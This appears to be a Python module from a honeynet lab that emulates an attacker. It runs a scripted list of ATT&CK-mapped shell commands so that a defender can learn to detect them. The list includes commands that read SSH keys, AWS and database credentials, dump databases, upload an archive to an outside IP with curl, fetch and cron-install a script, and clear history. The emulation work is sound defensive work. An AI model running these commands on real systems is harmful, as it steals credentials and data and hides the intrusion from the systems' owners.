"""Adversary-emulation attacker: a deterministic 'technique sweep' (think Atomic Red Team / Caldera).

It marches through a broad library of ATT&CK techniques — recon, discovery, credential access, lateral
movement, collection, exfiltration, defense evasion, persistence, privilege escalation — running one real
command per technique against the honeynet. Scripted, so it is fast and 100% reliable, and every command
maps to a distinct ATT&CK ID (collector/attack_mapping.py). The defender observes the full technique
surface in one run, which is the corpus it profiles / learns from.

Run in the lab:  python -m local.run attack --attacker sweep
"""
from __future__ import annotations

import json
import time
from dataclasses import dataclass, field
from pathlib import Path

# (command, ATT&CK id, tactic) — one line per technique the blue team should learn to see.
TECHNIQUES: list[tuple[str, str, str]] = [
    # recon / discovery
    ("whoami", "T1033", "discovery"),
    ("id", "T1033", "discovery"),
    ("uname -a", "T1082", "discovery"),
    ("hostname", "T1082", "discovery"),
    ("cat /etc/os-release", "T1082", "discovery"),
    ("env", "T1082", "discovery"),
    ("df -h", "T1082", "discovery"),
    ("cat /etc/passwd", "T1087.001", "discovery"),
    ("getent group", "T1069.001", "discovery"),
    ("cat /etc/hosts", "T1016", "discovery"),
    ("ip a", "T1016", "discovery"),
    ("arp -a", "T1016", "discovery"),
    ("ss -tnp", "T1049", "discovery"),
    ("netstat -antp", "T1049", "discovery"),
    ("ps aux", "T1057", "discovery"),
    ("systemctl list-units --type=service", "T1007", "discovery"),
    ("dpkg -l", "T1518", "discovery"),
    ("w", "T1033", "discovery"),
    ("sudo -l", "T1033", "privilege-escalation"),
    ("ls -la /home", "T1083", "discovery"),
    ("find / -perm -4000 -type f 2>/dev/null", "T1548.001", "privilege-escalation"),
    # credential access
    ("find /opt /srv /var -name '*.env' 2>/dev/null", "T1552.001", "credential-access"),
    ("cat /opt/deploy/credentials.env", "T1552.001", "credential-access"),
    ("cat ~/.aws/credentials", "T1552.001", "credential-access"),
    ("cat ~/.ssh/id_rsa", "T1552.004", "credential-access"),
    ("cat ~/.pgpass", "T1552.001", "credential-access"),
    ("grep -ri password /etc 2>/dev/null", "T1552.001", "credential-access"),
    ("cat ~/.bash_history", "T1552.003", "credential-access"),
    # lateral movement
    ("sshpass -p 'hunter2' ssh deploy@data-store-01", "T1021.004", "lateral-movement"),
    # collection
    ("mysqldump -u root --all-databases", "T1005", "collection"),
    ("cp /var/backups/customers.sql /tmp/loot.sql", "T1005", "collection"),
    ("tar czf /tmp/loot.tgz /var/backups", "T1560.001", "collection"),
    # exfiltration
    ("base64 /tmp/loot.tgz > /tmp/loot.b64", "T1132.001", "exfiltration"),
    ("curl -F file=@/tmp/loot.tgz http://10.8.8.8/upload", "T1041", "exfiltration"),
    ("wget http://10.8.8.8/tool.sh -O /tmp/tool.sh", "T1105", "command-and-control"),
    # persistence
    ("echo '* * * * * /tmp/tool.sh' | crontab -", "T1053.003", "persistence"),
    ("echo 'alias ll=ls' >> ~/.bashrc", "T1546.004", "persistence"),
    ("useradd -m svc-backup", "T1136.001", "persistence"),
    ("cat ~/.ssh/authorized_keys", "T1098.004", "persistence"),
    ("sudo su -", "T1548.003", "privilege-escalation"),
    # defense evasion (last: cover tracks)
    ("touch -t 202001010000 /tmp/loot.tgz", "T1070.006", "defense-evasion"),
    ("rm -f /tmp/loot.sql /tmp/loot.b64", "T1070.004", "defense-evasion"),
    ("history -c", "T1070.003", "defense-evasion"),
    ("unset HISTFILE", "T1070.003", "defense-evasion"),
]


@dataclass
class SweepStep:
    t: int
    host: str
    command: str
    technique: str
    tactic: str


@dataclass
class SweepResult:
    run_id: str
    persona: str = "sweep"
    steps: list[SweepStep] = field(default_factory=list)
    _hosts: list[str] = field(default_factory=list)

    @property
    def commands(self) -> int:
        return len(self.steps)

    @property
    def entered_hosts(self) -> list[str]:
        return self._hosts

    def to_groundtruth(self) -> dict:
        techs = sorted({s.technique for s in self.steps})
        return {"run_id": self.run_id, "persona": "sweep",
                "objective": f"adversary-emulation technique sweep: {len(techs)} ATT&CK techniques across "
                             "recon, discovery, credential access, lateral movement, collection, exfiltration, "
                             "persistence, privilege escalation and defense evasion",
                "techniques": techs,
                "steps": [{"t": s.t, "intent": s.tactic, "command": s.command} for s in self.steps]}


@dataclass
class SweepConfig:
    entry_host: str
    entry_user: str
    entry_password: str
    entry_port: int = 2222
    step_delay_s: float = 0.0
    tactics: tuple = ()          # if set, only run techniques whose tactic is listed (phased emulation)
    limit: int = 0               # if >0 (or env MIRAGE_SWEEP_LIMIT), run only the first N techniques (incremental reveal)


class Sweep:
    """Runs the technique library against the honeynet from the entry foothold."""

    def __init__(self, cfg: SweepConfig, connector, run_id: str | None = None):
        self.cfg = cfg
        self.net = connector
        self.run_id = run_id or "r-sweep-1"

    def run(self) -> SweepResult:
        res = SweepResult(self.run_id, _hosts=[self.cfg.entry_host])
        sess = self.net.connect(self.cfg.entry_host, self.cfg.entry_port, self.cfg.entry_user, self.cfg.entry_password)
        if sess is None:
            return res
        try:
            import os
            lib = [t for t in TECHNIQUES if not self.cfg.tactics or t[2] in self.cfg.tactics]
            limit = self.cfg.limit or int(os.environ.get("MIRAGE_SWEEP_LIMIT", "0") or 0)
            if limit > 0:
                lib = lib[:limit]
            for i, (cmd, tech, tactic) in enumerate(lib, 1):
                try:
                    sess.run(cmd)                       # the honeynet logs it; the collector maps the technique
                except Exception:
                    pass
                res.steps.append(SweepStep(i, self.cfg.entry_host, cmd, tech, tactic))
                if self.cfg.step_delay_s:
                    time.sleep(self.cfg.step_delay_s)
        finally:
            try:
                sess.close()
            except Exception:
                pass
        return res
